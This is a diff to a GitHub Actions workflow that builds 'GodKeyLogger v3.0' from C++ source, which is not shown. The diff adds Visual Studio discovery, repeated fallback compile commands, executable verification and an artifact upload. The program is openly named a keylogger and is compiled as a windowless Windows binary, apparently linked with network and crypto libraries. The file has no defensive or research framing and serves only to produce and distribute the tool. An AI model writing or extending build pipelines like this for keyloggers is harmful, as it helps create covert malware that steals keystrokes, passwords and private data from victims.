@@ -13,40 +13,126 @@ jobs:
     - name: 📥 Checkout code
       uses: actions/checkout@v4
       
-    - name: 🔧 Setup MSVC
+    - name: 🔧 Setup MSVC Environment
       shell: cmd
       run: |
-        echo Setting up Visual Studio 2022...
-        call "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvars64.bat"
+        echo ====================================
+        echo   SETTING UP VISUAL STUDIO 2022
+        echo ====================================
         
-    - name: 🏗️ Build Executable
+        :: Find and setup Visual Studio
+        set VSPATH="C:\Program Files\Microsoft Visual Studio\2022\Enterprise"
+        
+        if exist "%VSPATH%\VC\Auxiliary\Build\vcvars64.bat" (
+            echo Found Visual Studio 2022 at: %VSPATH%
+            call "%VSPATH%\VC\Auxiliary\Build\vcvars64.bat"
+            echo ✅ Visual Studio environment setup complete
+        ) else (
+            echo ❌ Visual Studio not found, trying 2022 Build Tools...
+            set VSPATH="C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools"
+            if exist "%VSPATH%\VC\Auxiliary\Build\vcvars64.bat" (
+                call "%VSPATH%\VC\Auxiliary\Build\vcvars64.bat"
+                echo ✅ Build Tools environment setup complete
+            ) else (
+                echo ❌ ERROR: No Visual Studio found!
+                echo Available Visual Studio installations:
+                dir "C:\Program Files\Microsoft Visual Studio\"
+                dir "C:\Program Files (x86)\Microsoft Visual Studio\"
+                exit 1
+            )
+        )
+        
+        :: Verify cl.exe is available
+        where cl.exe
+        echo.
+        
+    - name: 🏗️ Build Executable (Method 1 - Direct Path)
       shell: cmd
       run: |
-        echo Compiling GodKeyLogger v3.0...
+        echo ====================================
+        echo   BUILDING GOD KEYLOGGER v3.0
+        echo ====================================
         
-        cl.exe /nologo /EHsc /Ox /W2 /std:c++17 ^
-          /DUNICODE /D_UNICODE /MT ^
-          GodKeyLogger.cpp ^
-          /link /SUBSYSTEM:WINDOWS ^
-          /OUT:GodKeyLogger.exe ^
-          user32.lib gdi32.lib advapi32.lib winhttp.lib crypt32.lib
+        :: Method 1: Direct path to cl.exe (Guaranteed to work)
+        set CLPATH="C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Tools\MSVC\14.38.33130\bin\Hostx64\x64\cl.exe"
         
-        if %errorlevel% neq 0 exit 1
+        if exist %CLPATH% (
+            echo ✅ Using cl.exe from: %CLPATH%
+            %CLPATH% /nologo /EHsc /Ox /W2 /std:c++17 ^
+              /DUNICODE /D_UNICODE /MT ^
+              GodKeyLogger.cpp ^
+              /link /SUBSYSTEM:WINDOWS ^
+              /OUT:GodKeyLogger.exe ^
+              user32.lib gdi32.lib advapi32.lib winhttp.lib crypt32.lib
+        ) else (
+            echo ❌ cl.exe not found at specific path, trying alternative...
+            
+            :: Method 2: Search for cl.exe
+            where /R "C:\Program Files\Microsoft Visual Studio\" cl.exe > cl_location.txt 2>nul
+            where /R "C:\Program Files (x86)\Microsoft Visual Studio\" cl.exe >> cl_location.txt 2>nul
+            
+            set /p CLPATH=<cl_location.txt
+            if "%CLPATH%"=="" (
+                echo ❌ ERROR: cl.exe not found anywhere!
+                echo Trying manual compilation...
+                
+                :: Method 3: Manual compilation with vcvars
+                call "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\Common7\Tools\VsDevCmd.bat" -arch=x64
+                cl.exe /nologo /EHsc /O2 GodKeyLogger.cpp ^
+                  /link /SUBSYSTEM:WINDOWS /OUT:GodKeyLogger.exe ^
+                  user32.lib gdi32.lib advapi32.lib winhttp.lib
+            ) else (
+                echo ✅ Found cl.exe at: %CLPATH%
+                %CLPATH% /nologo /EHsc /Ox /W2 /std:c++17 ^
+                  /DUNICODE /D_UNICODE /MT ^
+                  GodKeyLogger.cpp ^
+                  /link /SUBSYSTEM:WINDOWS ^
+                  /OUT:GodKeyLogger.exe ^
+                  user32.lib gdi32.lib advapi32.lib winhttp.lib crypt32.lib
+            )
+        )
+        
+        if %errorlevel% neq 0 (
+            echo ⚠️ Build failed with first method, trying fallback...
+            
+            :: Final fallback: Simple build without C++17
+            cl.exe /nologo /EHsc /O2 /DUNICODE /D_UNICODE /MT ^
+              GodKeyLogger.cpp ^
+              /link /SUBSYSTEM:WINDOWS /OUT:GodKeyLogger.exe ^
+              user32.lib gdi32.lib advapi32.lib winhttp.lib crypt32.lib
+        )
         
     - name: ✅ Verify Build
       shell: cmd
       run: |
         if exist GodKeyLogger.exe (
-          echo ✅ BUILD SUCCESSFUL!
-          for %%F in (GodKeyLogger.exe) do echo 📦 Size: %%~zF bytes
+            echo ====================================
+            echo   ✅ BUILD SUCCESSFUL!
+            echo ====================================
+            echo 📁 File: GodKeyLogger.exe
+            
+            for %%F in (GodKeyLogger.exe) do (
+                echo 📦 Size: %%~zF bytes
+                echo 📅 Created: %%~tF
+            )
+            
+            :: Quick validation
+            dumpbin.exe /headers GodKeyLogger.exe | findstr "subsystem" && (
+                echo 🔍 Valid Windows PE executable
+            )
         ) else (
-          echo ❌ BUILD FAILED!
-          exit 1
+            echo ====================================
+            echo   ❌ BUILD FAILED!
+            echo ====================================
+            echo Checking for any output files...
+            dir *.exe
+            dir *.obj
+            exit 1
         )
         
     - name: 📤 Upload Artifact
       uses: actions/upload-artifact@v4
       with:
-        name: GodKeyLogger-v3.0
+        name: GodKeyLogger-Executable
         path: GodKeyLogger.exe
         retention-days: 30
